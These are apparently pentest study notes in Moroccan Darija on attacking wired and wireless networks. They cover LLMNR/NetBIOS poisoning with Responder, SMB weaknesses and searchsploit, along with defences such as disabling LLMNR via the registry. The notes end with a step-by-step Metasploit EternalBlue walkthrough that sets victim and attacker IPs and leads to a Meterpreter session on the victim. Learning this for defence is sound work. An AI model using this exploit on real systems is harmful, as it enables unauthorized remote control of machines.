# Exploiting Wired and Wireless Networks

### Achno ghadi nt3almo man had lmodule 

- kifach nstaghlo tagharat li 3adna fchabaka dyalna kangolo lihom `network vulnerabilities`
- Tagharat li kayna fal chabak lasilkiya `Wi-Fi`
- 7olol wa toro9 bach ta7mi chabaka dyalk man had hajamat `mitigations`

### Man nasa2i& 
dir lab fhad tools f kali-linux
- Aircrack-ng bah attacke lwifi
- Wireshark bach ndiro ta7lil les packets
- Nmap bach ndiro wahd lfa7s lchabaka
- bettercap wa responder bach ndir hajamat 3la dakhil chabaka

## Windows Name Resolution and SMB Attacks

Name resolution ya3ni kifach nidam kayt3araf 3la 3anawin bal asma2 wa y7awlhom l IP kaynin bzaf dyal protocol li kaysta3mlo bach yt7awal ism dyal jihaz aw server l ip

- DNS Domain Name System
- NetBios kaykhdm 3la port UDP 137
- LLMNR Link-local Multicast Name Resoluion
-> kol wa7d man had protocol fihom tagharat momkin hacker ystaghlhom bach idir hajamat 3la chabaka
  bhal `SMB attacks`
### Chno howa NetBIOS w LLMNR 

had joj protocolat khdamin fal windows kay3awno ljihaz y3raf chkon kayn m3ah freseau 

- NetBIOS : protocol 9dim kaykhdam bal ism dyal ljihaz bach yl9a ip dyalo
- LLMNR : chabih l DNS walkin khdam ghir dakhil chabaka lma7aliya LAN kay3an ajhiza t3raf 3la ba3dyathom
-> na9dar ka attacker nji nchaghal adat responder nzwar ljawab hada kansmaywh `LLMNR spoofing` wa NetBIOS poisoning

#### adwat lin9dar nkhadmo fb7al had chabakat
1. Responder
2. NBNSpoof
3. Metasploit
4. Pupy

#### chno ndir bach na7mi rasi 
1. nsado LLMNR w NetBIOS man i3didat dyal windows
2. ndir 9awanin f firewall bach na7dar had protocol ila makanoch darorin
3. nra9b `Registry` dyal windows
- Lmifta7
   HKLM\Software\Policies\Microsoft\Windows NT\DNSClient \
- L9ima EnableMulticast = 0  ya3ni LLMNR masdod
#### 3lach SMB khatar
SMB fih bzaf dyal les failles de sécurité. Kayn hacker li y9der ykhdem exploit men hadchi w ydir :
1. accès l-PC dyalek bla password
2. ynzel malware
3. ychoufr fichiers dyalek w ytalab menk flous (ransomware)
#### chno hiya Searchsploit 
wahd lmaw9i3 fih jami3 tagharat smito `Exploit-DB`
ach tb7at fkali linux dir
```
searchsploit smb
```
W kaybda yb9a yb9a yaffichi lik liste dyal les exploits li 3andha 3la9a b SMB.

#### chno hiya EthernalBlue
hiya wahd taghra khatira bzaf kant tsarbat NSA (wa7ed l-agence Americaine) ou Shadow Brokers homa sar9ouha w 3tawha public.
- Tsta3mlat f virus kbira b7al `WannaCry` w  `Nyetya`
- Tkhalli l-hacker ydir accès l-PC dyalek remotely w ycontrolih.

```
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-
                                             framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only 
                                             affects Windows Server 2008 R2, Windows 7, Windows Embedded 
                                             Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
                                             Only affects Windows Server 2008 R2, Windows 7, Windows Embedded 
                                             Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows 
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target 
                                             machines.
<output omitted for brevity>
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.1.1.2
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.66.6
msf exploit(ms17_010_eternalblue) > exploit
```
1. use exploit/windows/smb/ms17_010_eternalblue
⟶ Hna kat9oul l-Metasploit: “ana bghit nsta3ml exploit dyal SMB li fih thaghrat MS17-010”.
2. show options
⟶ Kataffichi options li khas t3ammar:

- RHOSTS: ip dyal victime (waajib)

- RPORT: huwa port 445 dyal SMB (already set)

- LHOST: ip dyalek nta li ghat tsift lih session (waajib)

- SMBDomain, SMBUser, SMBPass: optional ila bghiti dir auth

- VERIFY_ARCH / VERIFY_TARGET: kaychouf wach target compatible

3. set RHOST 10.1.1.2
⟶ Katdir set RHOST m3a l-IP dyal l-PC li bghiti tattacka.
4. set LHOST 10.10.66.6
⟶ Katdir set LHOST m3a l-IP dyalek nta (attaquant) bash session trja3 lik.
5. exploit
⟶ Kat9oul l-Metasploit ibda l-attack.
Ila koulchi mzyan, ghadi t7ell lik Meterpreter session o t9der tdir control 3la l-PC dyal victime.



